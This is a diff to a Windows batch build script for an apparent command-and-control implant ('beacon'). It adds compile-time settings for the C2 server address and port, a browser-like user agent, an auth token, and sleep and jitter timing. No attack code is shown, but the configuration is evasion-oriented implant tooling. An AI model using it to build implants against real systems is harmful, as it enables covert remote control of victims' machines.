@@ -11,10 +11,25 @@ set SERVER_BOF_DIR=..\server\bofs
 if not exist "%BOF_BUILD_DIR%" mkdir "%BOF_BUILD_DIR%"
 if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"
 
+:: 1.1 Compile-time configuration overrides
+set "C2_SERVER_IP=%~1"
+set "C2_SERVER_PORT=%~2"
+set "C2_USER_AGENT=%~3"
+set "C2_AUTH_TOKEN=%~4"
+set "C2_SLEEP_BASE_MS=%~5"
+set "C2_SLEEP_JITTER_MS=%~6"
+
+if "%C2_SERVER_IP%"=="" set "C2_SERVER_IP=127.0.0.1"
+if "%C2_SERVER_PORT%"=="" set "C2_SERVER_PORT=8080"
+if "%C2_USER_AGENT%"=="" set "C2_USER_AGENT=Mozilla/5.0"
+if "%C2_AUTH_TOKEN%"=="" set "C2_AUTH_TOKEN="
+if "%C2_SLEEP_BASE_MS%"=="" set "C2_SLEEP_BASE_MS=5000"
+if "%C2_SLEEP_JITTER_MS%"=="" set "C2_SLEEP_JITTER_MS=3000"
+
 :: 2. Build Main Beacon Components
 echo [1/3] Compiling Beacon components...
 
-set BEACON_FLAGS=-c -O2 -I include -DBOF
+set BEACON_FLAGS=-c -O2 -I include -DBOF -DC2_SERVER_IP=\"%C2_SERVER_IP%\" -DC2_SERVER_PORT=%C2_SERVER_PORT% -DC2_USER_AGENT=\"%C2_USER_AGENT%\" -DC2_AUTH_TOKEN=\"%C2_AUTH_TOKEN%\" -DC2_SLEEP_BASE_MS=%C2_SLEEP_BASE_MS% -DC2_SLEEP_JITTER_MS=%C2_SLEEP_JITTER_MS%
 
 echo Compiling beacon.c...
 x86_64-w64-mingw32-gcc %BEACON_FLAGS% src\beacon.c -o "%BUILD_DIR%\beacon.obj"
